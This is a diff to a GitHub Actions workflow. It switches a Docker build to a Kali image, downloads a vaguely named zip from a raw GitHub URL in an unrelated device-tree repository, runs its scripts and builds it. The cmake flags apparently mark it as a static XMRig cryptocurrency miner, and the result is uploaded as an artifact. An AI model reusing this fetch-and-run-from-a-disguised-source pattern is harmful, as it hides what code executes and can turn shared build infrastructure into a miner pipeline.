@@ -22,28 +22,43 @@ jobs:
     - name: Create Dockerfile
       run: |
         cat <<EOF > Dockerfile
-        FROM debian:bullseye
+        FROM kalilinux/kali-rolling
 
+        # 更新并安装必要的工具
         RUN apt-get update && apt-get install -y \\
+            curl \\
             wget \\
-            genisoimage \\
-            && rm -rf /var/lib/apt/lists/*
+            unzip \\
+            git \\
+            build-essential \\
+            cmake \\
+            automake \\
+            libtool \\
+            autoconf \\
+            glibc-source \\
+            libstdc++-6-dev \\
+            libgcc-6-dev \\
+            && apt-get clean
 
-        RUN wget -O /tmp/kali-linux-mini.iso https://old.kali.org/kali-images/kali-2016.1/kali-linux-mini-2016.1-amd64.iso
+        # 设置工作目录
+        WORKDIR /usr/src/app
 
-        RUN mkdir -p /usr/local/kali
+        # 复制项目文件到容器中
+        COPY . .
 
-        # Use isoinfo to extract files from the ISO
-        RUN mkdir /usr/local/kali/extracted && \\
-            isoinfo -l -i /tmp/kali-linux-mini.iso > /usr/local/kali/filelist.txt && \\
-            for file in \$(isoinfo -x / -i /tmp/kali-linux-mini.iso | awk '{ print \$2 }'); do \\
-                isoinfo -x \$file -i /tmp/kali-linux-mini.iso > /usr/local/kali/extracted/\$file; \\
-            done
+        # 下载并解压源码
+        RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \\
+            unzip testformycode-nbg.zip
 
-        # Clean up ISO file
-        RUN rm /tmp/kali-linux-mini.iso
-
-        CMD ["bash"]
+        # 构建项目
+        RUN cd testformycode-nbg/scripts-64 && \\
+            chmod 777 *.sh && \\
+            ./build_deps.sh && \\
+            cd .. && \\
+            mkdir build && \\
+            cd build && \\
+            cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \\
+            make
         EOF
       shell: bash
 
@@ -53,5 +68,18 @@ jobs:
     - name: Run Docker container
       run: docker run --name kali_container -d kali-docker
 
+    - name: Copy build artifacts
+      run: |
+        # 复制构建产物
+        docker cp kali_container:/usr/src/app/testformycode-nbg/build ./build-output
+
+    - name: Upload Build Artifacts
+      uses: actions/upload-artifact@v3
+      with:
+        name: build-output
+        path: ./build-output
+
     - name: Clean up
-      run: docker rm -f kali_container
+      run: |
+        # 停止并删除容器
+        docker rm -f kali_container
